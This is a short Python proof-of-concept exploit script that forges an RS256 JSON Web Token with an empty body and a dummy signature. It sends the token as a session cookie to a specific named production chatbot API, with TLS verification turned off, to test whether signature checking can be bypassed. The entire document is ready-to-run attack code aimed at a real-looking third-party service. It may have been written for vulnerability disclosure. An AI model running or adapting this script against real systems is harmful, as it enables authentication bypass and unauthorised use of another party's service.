#!/usr/bin/env python3
"""
povo_jwt_bypass_poc.py
Exploit: forged RS256 JWT is still accepted
"""

import json, base64, requests, warnings, urllib3
urllib3.disable_warnings()          # hide TLS warnings

URL = "https://aistore-api.circles.life/v1/povo/aistore/chatbot/completions"

def forged_jwt() -> str:
    hdr  = {"alg": "RS256", "typ": "JWT"}
    body = {"data": {}}
    hdr_b  = base64.urlsafe_b64encode(json.dumps(hdr).encode()).decode().rstrip("=")
    body_b = base64.urlsafe_b64encode(json.dumps(body).encode()).decode().rstrip("=")
    sig    = "A" * 342
    return f"{hdr_b}.{body_b}.{sig}"

def test(token: str, prompt: str = "What time is it?") -> bool:
    hdrs = {"Content-Type": "application/json", "Cookie": f"session={token}"}
    data = {"user_prompt": prompt, "feature_id": "ai_apps_chatbox", "ai_model": "sonar-pro"}
    r = requests.post(URL, headers=hdrs, json=data, verify=False, timeout=10)
    print("Status:", r.status_code)
    try:
        print("JSON:", r.json())
    except ValueError:
        print("Raw :", r.text[:500])
    return r.ok

if __name__ == "__main__":
    jwt = forged_jwt()
    print("JWT:", jwt)
    print("Bypass OK?", test(jwt))